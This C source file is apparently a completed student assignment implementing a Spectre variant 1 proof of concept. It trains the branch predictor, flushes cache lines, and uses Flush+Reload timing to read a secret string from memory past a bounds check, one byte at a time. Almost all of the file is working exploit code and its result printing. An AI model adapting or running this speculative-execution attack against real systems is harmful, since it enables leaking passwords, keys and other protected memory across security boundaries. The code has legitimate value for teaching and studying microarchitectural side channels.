#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include <limits.h>

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

// used to prevent the compiler from optimizing out victim_function()
uint8_t temp = 0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}

/**
 * Spectre Attack Function to Read Specific Byte.
 *
 * @param malicious_x The malicious x used to call the victim_function
 *
 * @param values      The two most likely guesses returned by your attack
 *
 * @param scores      The score (larger is better) of the two most likely guesses
 */
void attack(size_t malicious_x, uint8_t value[2], int score[2]) {
  // TODO: Write this function
  #define THRESHOLD 110
  
  #define RUNS 1000

  // loop vars
  int run, i, anti_prefetch_i;
  // branch training vars
  size_t x, legal_x;
  // result vars
  int best_i, second_best_i;

  int hit_count[256] = {0};
  volatile unsigned int junk = 0;


  for (run = 0; run < RUNS; run++)
  {
    for(i = 0; i < 256; i++) {
      _mm_clflush(&array2[i * 512]);
    }

    for(i = 0; i < 100000; i++);

    // Combine training and attacking in a single loop. If we had one loop for training and one for attacking
    // the branch history can change between the two loops, resulting in a lower success rate

    // Intel is a mystery. The most recent reliable information I could find on their branch preditor
    // is from 1999 https://courses.cs.washington.edu/courses/csep501/05au/x86/24512701.pdf
    // According to that document(p. 30), it "can track up to the last four branch directions per branch address"
    
    // So, we run train the branch predictor for 5 runs, then we attack on the sixth,
    // so we are guaranteed that the branch history dictates that the branch should be taken
    
    // we do this 5 times to increase probability of success

    // try attack with each valid x used as the predictor RUNS/16 times
    legal_x = run % array1_size;
    for(i = 29; i >= 0; i--) {
      // delay the computation by flushing the variables in the bound check
      _mm_clflush(&array1_size);
      // delay the computation between legal loop iterations and the malicious one by evicting values
      // associated with legal_x
      _mm_clflush(&array2[array1[legal_x] * 512]);
      _mm_clflush(&array1[legal_x]);

      // wait for clflush to commit
      for (volatile int j = 0; j < 100; j++);

      // memory fence
      _mm_mfence();
      
      // if it is the sixth run, i.e. i % 6 == 0, we need to set x to be malicious_x
      // to avoid conditional branches which can mess up the training of our branch predictor,
      // we use bit predication

      // if i % 6 == 0, set x to be all 1s, otherwise all 0s
      // x = !(i % 6 == 0) - 1 doesn't seem to work, i'm guessing "==" affects the branch predictor
      // To emulate it, we can again perform the modulo operation and directly subtract 1
      // this will result in either 0xFF..FF(when i % 6 == 0) or an integer 0-4(when i % 6 != 0)
      // we then omit the least significant nibble, since it can contain a non-0-or-F value
      x = ((i % 6) - 1) & ~0xF;
      // to correct the omitted nibble, copy the value from the 2nd least significant nibble to the first one
      // by or-ing the 4-time(nibble-sized) bitshifted value of x with itself 
      x |= x >> 4;
      // set x to either malicious_x or legal_x, or is mutually exclusive since one of
      // ~x & legal_x or x & malicious_x is guaranteed to be all 0
      x = (x & malicious_x) | (~x & legal_x);

      
      victim_function(x);
    }

    // Flush+Reload throwback :)
    for (int i = 0; i < 256; ++i) {
      // Prevent prefetching from messing with our cache
      // A thing I learned from cryptography is, prime numbers are cool :),
      // we can use them to get all numbers from 0x00 to 0xFF, with some degree of unpredictability
      anti_prefetch_i = ((i * 151) + 11) & 0xFF;
      // omit the value in case the index we're testing is the same as the x we're training with
      // as the value would likely be in the cache
      if(anti_prefetch_i == array1[legal_x]) {
        continue;
      }
      
      uint64_t s0 = __rdtscp((uint32_t *)&junk);
      junk = array2[anti_prefetch_i * 512];
      uint64_t delta = __rdtscp((uint32_t *)&junk) - s0;

      // check if it is less than the threshold
      if (delta < THRESHOLD){
        hit_count[anti_prefetch_i]++;
      } 
    }

  }

  best_i = second_best_i = 0;
  // get the indices of the two highest scores
  for (i = 0; i < 256; i++)
  {
    if(hit_count[i] > hit_count[best_i]){
      second_best_i = best_i;
      best_i = i;
    } else if (hit_count[i] > hit_count[second_best_i]) {
      second_best_i = i;
    }
  }

  value[0] = (uint8_t) best_i;
  value[1] = (uint8_t) second_best_i;
  score[0] = hit_count[best_i];
  score[1] = hit_count[second_best_i];
}

int main(int argc, const char **argv) {
  printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
  size_t malicious_x = (size_t)(secret - (char *)array1); /* read the secret */
  int score[2], len = strlen(secret);
  uint8_t value[2];

  // initialize array2 to make sure it is in its own physical page and
  // not in a copy-on-write zero page
  for (size_t i = 0; i < sizeof(array2); i++)
    array2[i] = 1; 

  // attack each byte of the secret, successively
  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    attack(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    printf("\n");
  }
  return (0);
}
